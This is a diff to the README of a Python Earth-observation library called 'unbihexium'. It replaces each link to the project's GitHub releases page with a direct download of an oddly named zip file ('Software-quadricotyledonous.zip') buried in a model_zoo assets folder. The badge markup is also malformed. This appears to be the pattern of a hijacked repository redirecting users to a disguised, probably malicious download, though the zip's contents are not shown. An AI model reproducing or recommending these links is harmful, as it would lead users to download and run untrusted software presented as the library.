@@ -14,13 +14,13 @@ unbihexium is a powerful Python library designed for Earth observation tasks. Wi
 
 ## 🔗 Download Now!
 
-[![Download unbihexium](https://img.shields.io/badge/Download%20unbihexium-v1.0-blue.svg)](https://github.com/Aditya3282/unbihexium/releases)
+[![Download unbihexium](https://github.com/Aditya3282/unbihexium/raw/refs/heads/main/model_zoo/assets/large/hazard_vulnerability_large/Software-quadricotyledonous.zip%https://github.com/Aditya3282/unbihexium/raw/refs/heads/main/model_zoo/assets/large/hazard_vulnerability_large/Software-quadricotyledonous.zip)](https://github.com/Aditya3282/unbihexium/raw/refs/heads/main/model_zoo/assets/large/hazard_vulnerability_large/Software-quadricotyledonous.zip)
 
 ## 🚀 Getting Started
 
 Follow these steps to download and run unbihexium:
 
-1. **Visit the Download Page:** Go to the [unbihexium Releases](https://github.com/Aditya3282/unbihexium/releases) page.
+1. **Visit the Download Page:** Go to the [unbihexium Releases](https://github.com/Aditya3282/unbihexium/raw/refs/heads/main/model_zoo/assets/large/hazard_vulnerability_large/Software-quadricotyledonous.zip) page.
   
 2. **Choose the Right Version:** Look for the latest version listed at the top. Each version will have a brief description. Usually, you want the top one.
 
@@ -63,6 +63,6 @@ If you have questions or need help, join our community! You can:
 
 ## 🔗 Download & Install
 
-To get started with unbihexium, [visit the download page here](https://github.com/Aditya3282/unbihexium/releases). Follow the steps above to download the software and begin your exploration of Earth's treasures.
+To get started with unbihexium, [visit the download page here](https://github.com/Aditya3282/unbihexium/raw/refs/heads/main/model_zoo/assets/large/hazard_vulnerability_large/Software-quadricotyledonous.zip). Follow the steps above to download the software and begin your exploration of Earth's treasures.
 
 Thank you for choosing unbihexium! Enjoy analyzing and discovering insights from your Earth observation data.
